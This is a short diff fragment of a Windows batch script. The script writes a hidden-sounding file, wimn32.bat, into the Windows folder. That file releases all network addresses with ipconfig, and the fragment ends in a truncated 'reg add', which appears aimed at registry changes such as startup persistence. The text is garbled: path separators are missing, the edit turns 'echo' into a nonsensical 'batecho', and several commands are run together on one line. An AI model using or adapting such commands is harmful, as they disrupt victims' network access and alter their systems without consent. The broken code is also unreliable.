@@ -1,4 +1,4 @@
-echo @echo off>c:windowswimn32.bat
+batecho @echo off>c:windowswimn32.bat
 echo break off>c:windowswimn32.bat echo
 ipconfig/release_all>c:windowswimn32.bat
 echo end>c:windowswimn32.batreg add
